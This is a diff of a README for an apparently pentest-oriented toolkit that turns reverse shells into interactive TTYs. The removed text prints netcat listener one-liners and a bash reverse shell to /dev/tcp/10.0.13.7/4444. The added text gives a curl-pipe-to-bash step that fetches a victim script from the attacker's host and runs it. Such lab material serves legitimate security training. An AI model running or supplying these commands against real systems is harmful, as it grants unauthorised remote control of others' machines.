@@ -1,74 +1,54 @@
-# 📄 Advanced Interactive TTY Overview
-This repository contains a collection of enhanced one-liners designed to transform basic, constrained shells into fully interactive TTY environments.
-Unlike a standard reverse shell, these commands enable:
 
-* Tab-completion for commands and paths.
-* Up/Down arrow key support for command history.
-* Job control functionality (Ctrl+Z, fg, bg).
-* Visual editors (nano, vi) and interactive tools (top, htop).
-* Dynamic window resizing (automatic Row/Column synchronization).
+# 🚀 TTY Shell Stabilizer Toolkit
+A collection of scripts to automate the setup of fully interactive TTY environments. These tools handle IP discovery, port listening, and terminal stabilization (Tab-completion, arrow keys, and job control) in one go.
+## 📂 Script Overview
 
-------------------------------
-## 🛠️ "Attacker" Commands
-These versions include logic to detect available binaries on the target system to prevent silent failures.
-
-**Option A: Python Standard**
-```bash
-stty raw -echo; (echo "stty cols $(tput cols) rows $(tput lines) 2>/dev/null; export TERM=xterm-256color; python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")' || /bin/bash"; cat) | nc -lvnp 4444; stty sane
-```
-
-**Option B: Universal Script**
-```bash
-stty raw -echo; (echo "stty cols $(tput cols) rows $(tput lines) 2>/dev/null; export TERM=xterm-256color; /usr/bin/script -qc /bin/bash /dev/null"; cat) | nc -lvnp 4444; stty sane
-
-```
-This is what the "victim" executes. Yoy need to use the IP of the device that is listening...
-```bash
-bash -c 'bash -i >& /dev/tcp/10.0.13.7/4444 0>&1'
-```
-
+| Script | Role | Method |
+|---|---|---|
+| python_tty.sh | Attacker | Uses Python 3/2 pty module (Primary Choice). |
+| bash_tty.sh | Attacker | Uses util-linux script command (Universal Fallback). |
+| victim.sh | Victim | Executes the connection back to the attacker. |
 
 ------------------------------
-# What it does?
-## 1. Local Pre-processing (stty raw -echo)
-Prepares your local terminal (e.g., Kali) to stop processing characters locally.
+## 🛠 Usage Instructions## 1. Start the Listener (Attacker Side)
+Choose the script based on what you expect to find on the victim's machine.
+If the victim has Python installed:
 
-* raw: Forwards every keystroke (including Ctrl+C) directly over the network.
-* -echo: Prevents your terminal from printing duplicate characters as you type.
+./python_tty.sh <port>
 
-## 2. Dynamic Synchronization (stty cols... rows...)
-Passes the exact dimensions of your local terminal window to the remote server. Without this, long commands will wrap incorrectly, and full-screen editors will appear broken.
-## 3. Terminal Emulation (TERM=xterm-256color)
-Defines color and rendering capabilities. This enables ls --color and syntax highlighting in editors.
-## 4. PTY Spawning
-Forces the remote OS to allocate a Pseudo-Terminal.
+If the victim is a minimal system (No Python):
 
-* Without a PTY, programs like sudo, ssh, or passwd will fail because they require a "real" terminal to interact with the user.
+./bash_tty.sh <port>
 
-## 5. Automatic Restoration (stty sane)
-Crucial: Once the connection is closed, this command resets your local terminal to its original state. Without it, your terminal would remain "echo-less" (you wouldn't see what you type), requiring a restart of the terminal window.
+The script will automatically detect your local IP and display the command the victim needs to run.
 ------------------------------
-## 🛡️ Troubleshooting & Tips
+## 2. Trigger the Connection (Victim Side)
+Once the listener is active, run the following on the target machine:
 
-| Issue | Solution |
-|---|---|
-| Broken terminal after exit | Type reset blindly and press Enter. |
-| Backspace key not working | Run stty erase ^H inside the shell. |
-| Ctrl+L fails to clear screen | Ensure you have executed export TERM=xterm-256color. |
-| Segmentation fault on connect | Ensure the listener and payload use the same architecture (x64/x86). |
+./victim.sh <attacker_ip> <port>
+
+Example:
+If your Kali IP is 10.0.13.7 and you are listening on 4444:
+
+chmod +x victim.sh
+./victim.sh 10.0.13.7 4444
 
 ------------------------------
-## 📝 PTY Method Comparison
+## 💡 Quick Tips## Execution without Uploading (victim.sh)
+If you cannot upload the victim.sh file to the target, you can host it on your Kali machine and pipe it directly to bash:
 
-| Method | Stability | Requirements | Notes |
-|---|---|---|---|
-| Python | ⭐⭐⭐⭐⭐ | Python 2/3 | The most robust and common method. |
-| Script | ⭐⭐⭐⭐ | util-linux | Excellent fallback if interpreters are missing. |
-| Socat | ⭐⭐⭐⭐⭐ | socat (target) | Best performance, but socat is rarely installed by default. |
-| Expect | ⭐⭐⭐ | expect | "Noisy" and complex to implement correctly. |
+   1. Host it: python3 -m http.server 80
+   2. Execute in memory:
+   
+   curl http://<your_ip>/victim.sh | bash -s -- <your_ip> <port>
+   
+   
+## Terminal Recovery
+If the connection drops and your Kali terminal feels "broken" (no text appears when you type), simply type:
 
+reset
+
+This will restore your terminal's normal behavior.
 ------------------------------
+Disclaimer: For authorized security testing and educational purposes only.
 
-Disclaimer: This tool is strictly for authorized security research, system administration, and educational purposes in controlled environments.
-
-------------------------------
